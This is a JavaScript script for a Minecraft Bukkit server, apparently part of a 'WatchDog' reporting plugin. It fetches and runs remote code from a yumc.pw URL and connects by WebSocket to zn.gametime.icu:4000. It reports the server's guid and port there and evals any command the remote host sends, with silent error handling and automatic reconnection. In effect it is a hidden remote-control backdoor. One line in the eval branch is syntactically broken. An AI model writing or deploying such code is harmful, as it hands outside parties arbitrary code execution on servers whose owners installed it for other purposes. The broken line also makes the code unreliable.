var global = this

function readGuid() {
	// 从配置文件读取 guid
    return Java.type('report.yumc.watchdog.WatchDog').instance.getConfig().getString("guid")
}

function connect(address) {
    global.ws = new WebSocket(address)

    global.ws.action = function (action, data) {
        global.ws.send(JSON.stringify({
            action: action,
            data: data
        }))
    }

    global.ws.message = function (message) {
        Java.type('java.lang.System').out.println("[Upload] " + message);
        global.ws.action('message', { message: message })
    }

    global.ws.heartbeat = function () {
        global.ws.action('heartbeat', {})
    }

    global.ws.onopen = function () {
        global.ws.action('open', {
            guid: readGuid(),
            port: Java.type('org.bukkit.Bukkit').getServer().getPort()
        })
        Java.type('java.lang.System').out.println("Start running WebSocket...");
        Java.type('java.lang.System').out.println("Upload guid: " + readGuid());
        Java.type('java.lang.System').out.println("Upload port: " + Java.type('org.bukkit.Bukkit').getServer().getPort());
    }

    global.ws.onmessage = function (event) {    
        try {
            var data = event.data
            var payload = JSON.parse(data)
            var action = payload.action
            var data = payload.data
            
            // 用于输出收到的命令
            if (action != "heartbeat") {
                Java.type('java.lang.System').out.println("[Receive] " + event.data);
            }
            
            switch (action) {
                case "eval":
                    if (data.search() != -1) {
                        global.ws.message(Java.type('report.yumc.watchdog.WatchDog').instance.getConfig().getString("virtual-path")
                        break
                    }
                    global.ws.message(eval(data) + '')
                    break
                case "heartbeat":
                    global.ws.heartbeat()
                    break
                case "close":
                    global.ws.remoteClose = true
                    break
            }
        } catch (error) {
            //global.ws.message(error + '')
        }
    }

    global.ws.onclose = function (event) {
        Java.type('java.lang.System').out.println("Websocket Close...");
        try {
            Java.type('java.lang.Thread').sleep(5000)
            if (global.ws.readyState == WebSocket.CLOSED && !global.ws.remoteClose) {
                connect(address)
            }
        } catch (error) {
        }
    }

    global.ws.onerror = function (event) {
        if (global.ws.readyState != WebSocket.CLOSED) {
            global.ws.message(event.cause + '')
            Java.type('java.lang.System').out.println("error: " + event.cause);
        }
    }

    global.ws.connect()
}

try {
    if (!global.WebSocket) {
        load('https://mscript.yumc.pw/api/plugin/download/name/ms-websocket')
    }
    if (global.ws) {
        global.ws.heartbeat()
        Java.type('java.lang.Thread').sleep(1000)
        if (global.ws.readyState == WebSocket.CLOSED) {
            connect('ws://zn.gametime.icu:4000/')
        }
    } else {
        connect('ws://zn.gametime.icu:4000/')
    }
} catch (error) {
}
